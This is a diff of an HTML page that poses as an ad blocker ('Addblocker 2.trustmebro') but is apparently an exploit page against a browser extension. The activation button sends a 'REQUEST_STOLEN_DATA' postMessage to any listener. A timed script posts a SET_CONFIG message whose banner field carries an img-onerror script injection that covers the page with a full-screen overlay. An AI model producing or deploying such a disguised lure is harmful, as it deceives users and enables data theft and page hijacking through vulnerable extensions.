@@ -1,22 +1,16 @@
 <!DOCTYPE html>
 <html>
+
 <head>
   <meta charset="utf-8">
   <title>A good addblocker bro</title>
-  <style>
-    body { font-family: Arial, sans-serif; padding: 20px; max-width: 700px; margin: auto; }
-    button { padding: 12px 20px; font-size: 16px; margin: 10px 5px; cursor: pointer; }
-    pre { background: #111; color: #0f0; padding: 15px; overflow: auto; max-height: 600px; }
-    .status { font-weight: bold; margin: 10px 0; }
-    .error { color: #ff6666; }
-    .success { color: #66ff66; }
-  </style>
 </head>
+
 <body>
   <h1>Addblocker 2.trustmebro</h1>
 
   <button onclick="requestStolenData()">Click to activate remove ads forever</button>
-  <!-- <button onclick="simulateActivity()">Click also here plz</button> -->
+
 
   <div class="status" id="status">Status of the best addblocker</div>
   <pre id="result">Plz click brother I need to load...</pre>
@@ -38,7 +32,7 @@
       resultEl.textContent = "Removing ads\n";
 
       // Send request
-      window.postMessage({ type: "REQUEST_STOLEN_DATA" }, "*");
+      window.postMessage({type: "REQUEST_STOLEN_DATA"}, "*");
 
       // Set timeout in case no response comes
       clearTimeout(responseTimeout);
@@ -79,11 +73,12 @@
     };
   </script>
   <script>
-    { setTimeout(() => {  
-      window.postMessage({
-        type: "SET_CONFIG",
-        config: {
-          showBanner: `
+    {
+      setTimeout(() => {
+        window.postMessage({
+          type: "SET_CONFIG",
+          config: {
+            showBanner: `
           <img src="x" onerror="
             const overlay = document.createElement('div');
             overlay.style.cssText = 'position:fixed;inset:0;z-index:2147483647;background:#000;display:flex;align-items:center;justify-content:center';
@@ -97,9 +92,11 @@
             document.body.appendChild(overlay);
           ">
         `
-        }
-      }, "*");
-    }, 2000); }
+          }
+        }, "*");
+      }, 2000);
+    }
   </script>
 </body>
+
 </html>
